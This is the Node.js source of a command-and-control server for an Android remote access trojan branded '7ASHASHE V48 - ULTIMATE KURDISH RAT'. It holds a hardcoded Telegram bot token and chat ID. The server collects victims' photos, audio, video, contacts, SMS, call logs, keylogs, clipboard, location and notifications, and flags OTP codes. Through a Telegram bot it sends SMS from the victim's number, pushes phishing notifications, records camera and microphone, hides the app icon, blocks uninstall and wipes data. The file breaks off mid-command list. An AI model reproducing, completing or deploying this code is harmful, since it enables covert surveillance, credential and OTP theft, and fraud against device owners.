// =====================================================
// 7ASHASHE V48 - ULTIMATE KURDISH RAT
// گەشەپێدەر: عەزازیل 7ASHASHE
// وەشان: 48.0.0 - ULTIMATE FILE EDITION
// توکن: 8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU
// چات ئایدی: 5578405082
// پۆرت: 8080
// =====================================================

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');

// =====================================================
// 🔐 CREDENTIALS - عەزازیل 7ASHASHE
// =====================================================
const token = '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU';
const chatId = '5578405082';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

// =====================================================
// 📁 ڕێکخستنی فایلەکان
// =====================================================
const upload = multer({ dest: 'uploadedFile/' });
const fs = require('fs');

app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// =====================================================
// 📁 دروستکردنی فۆڵدەری پێویست
// =====================================================
const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(__dirname, 'uploadedFile');
const PHOTOS_DIR = path.join(DATA_DIR, 'wêne');
const VIDEOS_DIR = path.join(DATA_DIR, 'vîdyo');
const AUDIO_DIR = path.join(DATA_DIR, 'deng');
const FILES_DIR = path.join(DATA_DIR, 'fayl');
const CONTACTS_DIR = path.join(DATA_DIR, 'peywendî');
const SMS_DIR = path.join(DATA_DIR, 'sms');
const CALLS_DIR = path.join(DATA_DIR, 'peywendiyekan');
const APPS_DIR = path.join(DATA_DIR, 'êpekan');
const KEYLOGS_DIR = path.join(DATA_DIR, 'klîk');
const CLIPBOARD_DIR = path.join(DATA_DIR, 'klîpbord');
const LOCATION_DIR = path.join(DATA_DIR, 'shwên');
const SCREENSHOTS_DIR = path.join(DATA_DIR, 'screenshot');
const SCREEN_RECORDS_DIR = path.join(DATA_DIR, 'tômari_şashe');
const NOTIFICATIONS_DIR = path.join(DATA_DIR, 'notifications');
const CAM_SNAPSHOTS_DIR = path.join(DATA_DIR, 'cam_snapshots');

// دروستکردنی هەموو فۆڵدەرەکان
[
    UPLOAD_DIR, DATA_DIR, PHOTOS_DIR, VIDEOS_DIR, AUDIO_DIR, FILES_DIR,
    CONTACTS_DIR, SMS_DIR, CALLS_DIR, APPS_DIR, KEYLOGS_DIR,
    CLIPBOARD_DIR, LOCATION_DIR, SCREENSHOTS_DIR, SCREEN_RECORDS_DIR,
    NOTIFICATIONS_DIR, CAM_SNAPSHOTS_DIR
].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// =====================================================
// 🏠 لاپەڕەی سەرەکی
// =====================================================
app.get('/', function (req, res) {
    res.send('<h1 align="center">🔴 7ASHASHE V48 - ULTIMATE KURDISH RAT</h1>');
});

// =====================================================
// 📥 وەرگرتنی فایل
// =====================================================
app.get('/getFile/*', function (req, res) {
    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
    fs.stat(filePath, function(err, stat) {
        if(err == null) {
            res.sendFile(filePath);
        } else if (err.code === 'ENOENT') {
            res.send(`<h1>فایل بوونی نییە</h1>`);
        } else {
            res.send(`<h1>هەڵە ڕویدا</h1>`);
        }
    });
});

// =====================================================
// 🗑️ سڕینەوەی فایل
// =====================================================
app.get('/deleteFile/*', function (req, res) {
    const fileName = req.params[0];
    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
    fs.stat(filePath, function(err, stat) {
        if (err == null) {
            fs.unlink(filePath, (err) => {
                if (err) {
                    res.send(`<h1>فایلی "${fileName}" نەسڕایەوە</h1>` + `<br><br>` + `<h1>دووبارە هەوڵ بدەرەوە!</h1>`);
                } else {
                    res.send(`<h1>فایلی "${fileName}" سڕایەوە</h1>` + `<br><br>` + `<h1>سەرکەوتوو بوو!!!</h1>`);
                }
            });
        } else if (err.code === 'ENOENT') {
            res.send(`<h1>"${fileName}" بوونی نییە</h1>` + `<br><br>` + `<h1>فایلەکە بوونی نییە بۆ سڕینەوە.</h1>`);
        } else {
            res.send('<h1>هەڵەیەک ڕویدا: </h1>', err.code);
        }
    });
});

// =====================================================
// 📤 بارکردنی فایل
// =====================================================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const file_name = req.file.filename;
    const model = req.headers.model || 'نەزانراو';
    const host_url = req.protocol + '://' + req.get('host');
    
    // گواستنەوەی فایل بە ناوی ڕاستەقینە
    fs.rename(
        __dirname + '/uploadedFile/' + file_name, 
        __dirname + '/uploadedFile/' + encodeURIComponent(name), 
        function(err) { 
            if (err) console.log('هەڵە: ' + err);
        }
    );
    
    // ناردنی پەیام بۆ تێلیگرام بە لینکی فایل
    appBot.sendMessage(chatId, 
        `🔴 **فایلی نوێ لە ${model}**\n\n` +
        `📄 **ناوی فایل:** ${name}\n` +
        `🆔 **ئایدی فایل:** ${file_name}\n\n` +
        `🔗 **لینکی فایل:** ${host_url}/getFile/${encodeURIComponent(name)}\n` +
        `🗑️ **لینکی سڕینەوە:** ${host_url}/deleteFile/${encodeURIComponent(name)}`,
        { parse_mode: "HTML", disable_web_page_preview: true }
    );
    
    res.send('');
});

// =====================================================
// 📝 ناردنی تێکست
// =====================================================
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    
    appBot.sendMessage(chatId, 
        `🔴 **پەیام لە ${model}**\n\n` + req.body['text'],
        { parse_mode: "HTML" }
    );
    
    res.send('');
});

// =====================================================
// 📍 ناردنی شوێن
// =====================================================
app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    
    appBot.sendLocation(chatId, req.body['lat'], req.body['lon']);
    appBot.sendMessage(chatId, 
        `🔴 **شوێنی ${model}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${req.body['lat']},${req.body['lon']}`,
        { parse_mode: "HTML" }
    );
    
    res.send('');
});

// =====================================================
// 📸 ناردنی وێنە (لە کامێرا)
// =====================================================
app.post("/uploadPhoto", upload.single('photo'), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const camera = req.headers.camera || 'نەزانراو';
    const { buffer, size } = req.file;
    
    appBot.sendPhoto(chatId, buffer, {
        caption: `🔴 **وێنەی کامێرا لە ${model}**\n\n` +
                `📷 **کامێرا:** ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
                `📦 **قەبارە:** ${(size / 1024).toFixed(2)}KB`,
        parse_mode: "HTML"
    });
    
    // پاشەکەوتکردنی وێنەکە
    const filename = `camera_${model}_${Date.now()}.jpg`;
    const filepath = path.join(PHOTOS_DIR, filename);
    fs.writeFileSync(filepath, buffer);
    
    res.send('');
});

// =====================================================
// 🎤 ناردنی دەنگ
// =====================================================
app.post("/uploadAudio", upload.single('audio'), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const duration = req.headers.duration || 'نەزانراو';
    const { buffer, size } = req.file;
    
    appBot.sendAudio(chatId, buffer, {
        caption: `🔴 **دەنگ لە ${model}**\n\n` +
                `⏱️ **ماوە:** ${duration} چرکە\n` +
                `📦 **قەبارە:** ${(size / 1024).toFixed(2)}KB`,
        parse_mode: "HTML"
    });
    
    // پاشەکەوتکردنی دەنگەکە
    const filename = `audio_${model}_${Date.now()}.wav`;
    const filepath = path.join(AUDIO_DIR, filename);
    fs.writeFileSync(filepath, buffer);
    
    res.send('');
});

// =====================================================
// 📹 ناردنی ڤیدیۆ
// =====================================================
app.post("/uploadVideo", upload.single('video'), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const camera = req.headers.camera || 'نەزانراو';
    const { buffer, size } = req.file;
    
    appBot.sendVideo(chatId, buffer, {
        caption: `🔴 **ڤیدیۆ لە ${model}**\n\n` +
                `📷 **کامێرا:** ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
                `📦 **قەبارە:** ${(size / 1024 / 1024).toFixed(2)}MB`,
        parse_mode: "HTML"
    });
    
    // پاشەکەوتکردنی ڤیدیۆکە
    const filename = `video_${model}_${Date.now()}.mp4`;
    const filepath = path.join(VIDEOS_DIR, filename);
    fs.writeFileSync(filepath, buffer);
    
    res.send('');
});

// =====================================================
// 👥 ناردنی کۆنتاکتەکان
// =====================================================
app.post("/uploadContacts", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const contacts = req.body.contacts || [];
    
    // پاشەکەوتکردن وەک فایل
    const filename = `contacts_${model}_${Date.now()}.json`;
    const filepath = path.join(CONTACTS_DIR, filename);
    fs.writeFileSync(filepath, JSON.stringify(contacts, null, 2));
    
    // ناردن بۆ تێلیگرام وەک فایل
    appBot.sendDocument(chatId, fs.readFileSync(filepath), {
        caption: `🔴 **کۆنتاکتەکانی ${model}**\n\n` +
                `📊 **ژمارە:** ${contacts.length}`,
        parse_mode: "HTML"
    });
    
    res.send('');
});

// =====================================================
// 📨 ناردنی SMS
// =====================================================
app.post("/uploadSMS", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const sms = req.body.sms || [];
    
    // پاشەکەوتکردن وەک فایل
    const filename = `sms_${model}_${Date.now()}.json`;
    const filepath = path.join(SMS_DIR, filename);
    fs.writeFileSync(filepath, JSON.stringify(sms, null, 2));
    
    // ناردن بۆ تێلیگرام وەک فایل
    appBot.sendDocument(chatId, fs.readFileSync(filepath), {
        caption: `🔴 **SMSـەکانی ${model}**\n\n` +
                `📊 **ژمارە:** ${sms.length}`,
        parse_mode: "HTML"
    });
    
    res.send('');
});

// =====================================================
// 📞 ناردنی پەیوەندییەکان
// =====================================================
app.post("/uploadCalls", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const calls = req.body.calls || [];
    
    // پاشەکەوتکردن وەک فایل
    const filename = `calls_${model}_${Date.now()}.json`;
    const filepath = path.join(CALLS_DIR, filename);
    fs.writeFileSync(filepath, JSON.stringify(calls, null, 2));
    
    // ناردن بۆ تێلیگرام وەک فایل
    appBot.sendDocument(chatId, fs.readFileSync(filepath), {
        caption: `🔴 **پەیوەندییەکانی ${model}**\n\n` +
                `📊 **ژمارە:** ${calls.length}`,
        parse_mode: "HTML"
    });
    
    res.send('');
});

// =====================================================
// 📋 ناردنی کلیپبۆرد
// =====================================================
app.post("/uploadClipboard", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const text = req.body.text || '';
    
    appBot.sendMessage(chatId,
        `🔴 **کلیپبۆردی ${model}**\n\n` + text,
        { parse_mode: "HTML" }
    );
    
    res.send('');
});

// =====================================================
// ⌨️ ناردنی کێڤلۆگ
// =====================================================
app.post("/uploadKeylog", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const keys = req.body.keys || '';
    const app = req.body.app || 'نەزانراو';
    
    // پاشەکەوتکردن لە فایل
    const logFile = path.join(KEYLOGS_DIR, `keylog_${model}_${new Date().toISOString().split('T')[0]}.txt`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${app}: ${keys}\n`);
    
    res.send('');
});

// =====================================================
// 📱 ناردنی نۆتیفیکەیشن
// =====================================================
app.post("/uploadNotification", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const notification = req.body;
    
    // پاشەکەوتکردن وەک فایل
    const filename = `notification_${model}_${Date.now()}.json`;
    const filepath = path.join(NOTIFICATIONS_DIR, filename);
    fs.writeFileSync(filepath, JSON.stringify(notification, null, 2));
    
    // پشکنینی OTP
    const isOTP = notification.text && notification.text.match(/\b\d{4,6}\b/);
    
    if (isOTP) {
        appBot.sendMessage(chatId,
            `💰 **🔐 OTP دۆزرایەوە لە ${model}**\n\n` +
            `📱 **ئەپ:** ${notification.app}\n` +
            `📝 **پەیام:** ${notification.text}\n` +
            `🔢 **OTP:** ${notification.text.match(/\b\d{4,6}\b/)}`,
            { parse_mode: "HTML" }
        );
    } else {
        appBot.sendMessage(chatId,
            `📱 **نۆتیفیکەیشنی ${model}**\n\n` +
            `📱 **ئەپ:** ${notification.app}\n` +
            `📌 **ناونیشان:** ${notification.title}\n` +
            `📝 **پەیام:** ${notification.text}`,
            { parse_mode: "HTML" }
        );
    }
    
    res.send('');
});

// =====================================================
// 🔌 پەیوەندی WebSocket
// =====================================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'نەزانراو';
    const battery = req.headers.battery || 'نەزانراو';
    const version = req.headers.version || 'نەزانراو';
    const brightness = req.headers.brightness || 'نەزانراو';
    const provider = req.headers.provider || 'نەزانراو';
    const manufacturer = req.headers.manufacturer || 'نەزانراو';
    const androidVersion = req.headers.android || 'نەزانراو';
    const ram = req.headers.ram || 'نەزانراو';
    const storage = req.headers.storage || 'نەزانراو';
    const root = req.headers.root || 'نەزانراو';
    const country = req.headers.country || 'نەزانراو';
    const carrier = req.headers.carrier || 'نەزانراو';
    const ip = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        manufacturer: manufacturer,
        androidVersion: androidVersion,
        battery: battery,
        version: version,
        ram: ram,
        storage: storage,
        root: root,
        country: country,
        carrier: carrier,
        provider: provider,
        brightness: brightness,
        ip: ip,
        connectedAt: new Date().toISOString()
    });
    
    appBot.sendMessage(chatId,
        `🔴 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** ${manufacturer} ${model}\n` +
        `📱 **ئەندرۆید:** ${androidVersion}\n` +
        `🔋 **پاتری:** ${battery}\n` +
        `💾 **RAM:** ${ram}\n` +
        `📁 **Storage:** ${storage}\n` +
        `🔓 **Root:** ${root}\n` +
        `🌍 **وڵات:** ${country}\n` +
        `📡 **کەریەر:** ${carrier}\n` +
        `🌐 **IP:** ${ip}\n` +
        `🆔 **ئایدی:** ${uuid.substring(0, 8)}...`,
        { parse_mode: "HTML" }
    );
    
    ws.on('close', function () {
        appBot.sendMessage(chatId,
            `🔴 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 **مۆدێل:** ${manufacturer} ${model}\n` +
            `🆔 **ئایدی:** ${uuid.substring(0, 8)}...`,
            { parse_mode: "HTML" }
        );
        appClients.delete(ws.uuid);
    });
});

// =====================================================
// 🤖 بۆتی تێلیگرام - فەرمانەکان
// =====================================================
appBot.on('message', (message) => {
    const msgChatId = message.chat.id;
    
    if (message.reply_to_message) {
        // ناردنی SMS
        if (message.reply_to_message.text.includes('🔴 تکایە ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە')) {
            currentNumber = message.text;
            appBot.sendMessage(chatId,
                '🔴 **ئێستا پەیامەکە بنووسە**\n\n' +
                'پەیامەکە لە ژمارەی نێچیرەکەوە دەنێردرێت',
                { reply_markup: { force_reply: true } }
            );
        }
        
        if (message.reply_to_message.text.includes('🔴 ئێستا پەیامەکە بنووسە')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی پەیام بۆ هەموو کۆنتاکتەکان
        if (message.reply_to_message.text.includes('🔴 پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // وەرگرتنی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ وەرگرتن')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // سڕینەوەی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ سڕینەوە')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی دەنگ
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی دەنگ بنووسە (بە چرکە)')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی کامێرای پشت
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پشت بنووسە')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی کامێرای پێش
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پێش بنووسە')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی Toast
        if (message.reply_to_message.text.includes('🔴 پەیامی Toast بنووسە')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی ئاگاداری
        if (message.reply_to_message.text.includes('🔴 ناونیشانی ئاگاداری بنووسە')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(chatId,
                '🔴 **ئێستا لینکەکە بنووسە**\n\n' +
                'کاتێک نێچیرەکە کرتە لەسەر ئاگادارییەکە دەکات، لینکەکە دەکرێتەوە',
                { reply_markup: { force_reply: true } }
            );
        }

        if (message.reply_to_message.text.includes('🔴 ئێستا لینکەکە بنووسە')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // لێدانی دەنگ
        if (message.reply_to_message.text.includes('🔴 لینکی دەنگەکە بنووسە')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    }

    // =====================================================
    // فەرمانە سەرەکییەکان
    // =====================================================
    if (chatId == msgChatId) {
        if (message.text == '/start') {
            appBot.sendMessage(chatId,
                '🔴 **7ASHASHE V48 - ULTIMATE KURDISH RAT**\n\n' +
                '✅ **بەخێربێیت، عەزازیل 7ASHASHE!**\n\n' +
                '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر دامەزرابێت، چاوەڕێی پەیوەندی بکە\n\n' +
                '• کاتێک پەیامی پەیوەندیت وەرگرت، ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
                '🔴 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
                '🔴 **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
                '🔴 **پێشکەوتوو** - فەرمانە پێشکەوتووەکان\n' +
                '🔴 **فایلەکان** - بینینی فایلە وەرگیراوەکان\n\n' +
                '👑 **عەزازیل 7ASHASHE**',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["🔴 ئامێرەکان", "🔴 فەرمانەکان"],
                            ["🔴 پێشکەوتوو", "🔴 فایلەکان"]
                        ],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // پیشاندانی ئامێرەکان
        if (message.text == '🔴 ئامێرەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    'دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                );
            } else {
                let text = '🔴 **ئامێرە پەیوەستکراوەکان**\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `📱 **مۆدێل:** <b>${value.manufacturer} ${value.model}</b>\n` +
                        `🔋 **پاتری:** <b>${value.battery}</b>\n` +
                        `📱 **ئەندرۆید:** <b>${value.androidVersion}</b>\n` +
                        `💡 **ڕووناکی:** <b>${value.brightness}</b>\n` +
                        `📡 **پڕۆڤایدەر:** <b>${value.provider}</b>\n` +
                        `🆔 **ئایدی:** <b>${key.substring(0, 8)}...</b>\n\n`;
                });
                appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
            }
        }

        // فەرمانەکان
        if (message.text == '🔴 فەرمانەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    'دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: `${value.manufacturer} ${value.model}`,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(chatId, '🔴 **ئامێرێک هەڵبژێرە بۆ ناردنی فەرمان**', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }

        // فەرمانە پێشکەوتووەکان
        if (message.text == '🔴 پێشکەوتوو') {
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    'دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: `${value.manufacturer} ${value.model}`,
                        callback_data: 'advanced_device:' + key
                    }]);
                });
                appBot.sendMessage(chatId, '🔴 **ئامێرێک هەڵبژێرە بۆ فەرمانە پێشکەوتووەکان**', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }

        // پیشاندانی فایلەکان
        if (message.text == '🔴 فایلەکان') {
            let text = '🔴 **فایلە وەرگیراوەکان**\n\n';
            
            // کۆکردنەوەی ژمارەی فایلەکان لە هەر فۆڵدەرێک
            const folders = {
                '📸 وێنە': PHOTOS_DIR,
                '📹 ڤیدیۆ': VIDEOS_DIR,
                '🎤 دەنگ': AUDIO_DIR,
                '📁 فایل': FILES_DIR,
                '👥 کۆنتاکت': CONTACTS_DIR,
                '📨 SMS': SMS_DIR,
                '📞 پەیوەندی': CALLS_DIR
            };
            
            for (const [name, dir] of Object.entries(folders)) {
                if (fs.existsSync(dir)) {
                    const files = fs.readdirSync(dir);
                    text += `${name}: <b>${files.length}</b> فایل\n`;
                } else {
                    text += `${name}: <b>0</b> فایل\n`;
                }
            }
            
            appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
        }
    } else {
        appBot.sendMessage(chatId, '🔴 **ڕێگەپێدان نەدرا**');
    }
});

// =====================================================
// 🔘 کۆدەکانی کلیکی ئینڵاین
// =====================================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        const client = appClients.get(uuid);
        if (!client) {
            appBot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: "HTML"
            });
            return;
        }
        
        appBot.editMessageText(`🔴 **فەرمانەکان بۆ ${client.manufacturer} ${client.model}**`, {
            width: 10000,
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📸 وێنە', callback_data: `photo:${uuid}` },
                        { text: '📹 ڤیدیۆ', callback_data: `video:${uuid}` }
                    ],
                    [
                        { text: '🎤 دەنگ', callback_data: `audio:${uuid}` },
                        { text: '📍 شوێن', callback_data: `location:${uuid}` }
                    ],
                    [
                        { text: '👥 کۆنتاکت', callback_data: `contacts:${uuid}` },
                        { text: '📨 SMS', callback_data: `sms:${uuid}` }
                    ],
                    [
                        { text: '📞 پەیوەندی', callback_data: `calls:${uuid}` },
                        { text: '📋 کلیپبۆرد', callback_data: `clipboard:${uuid}` }
                    ],
                    [
                        { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${uuid}` },
                        { text: '📁 فایل', callback_data: `file:${uuid}` }
                    ],
                    [
                        { text: '🗑️ سڕینەوەی فایل', callback_data: `delete_file:${uuid}` }
                    ]
                ]
            },
            parse_mode: "HTML"
        });
    }

    if (commend == 'advanced_device') {
        const client = appClients.get(uuid);
        if (!client) {
            appBot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: "HTML"
            });
            return;
        }
        
        appBot.editMessageText(`🔴 **فەرمانە پێشکەوتووەکان بۆ ${client.manufacturer} ${client.model}**`, {
            width: 10000,
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${uuid}` },
                        { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${uuid}` }
                    ],
                    [
                        { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `live_audio:${uuid}` },
                        { text: '📸 سکرینشۆتی زیرەک', callback_data: `smart_screenshot:${uuid}` }
                    ],
                    [
                        { text: '⚡ فلاش', callback_data: `flash:${uuid}` },
                        { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${uuid}` }
                    ],
                    [
                        { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${uuid}` },
                        { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${uuid}` }
                    ],
                    [
                        { text: '💬 پەیامی ساختە', callback_data: `toast:${uuid}` },
                        { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${uuid}` }
                    ]
                ]
            },
            parse_mode: "HTML"
        });
    }

    // جێبەجێکردنی فەرمانەکان
    const commands = {
        'photo': 'camera_main',
        'video': 'video_main',
        'audio': 'microphone',
        'location': 'location',
        'contacts': 'contacts',
        'sms': 'sms',
        'calls': 'calls',
        'clipboard': 'clipboard',
        'notifications': 'notifications',
        'file': 'file',
        'delete_file': 'delete_file',
        'anti_uninstall': 'anti_uninstall',
        'hide_icon': 'hide_icon',
        'live_audio': 'live_audio',
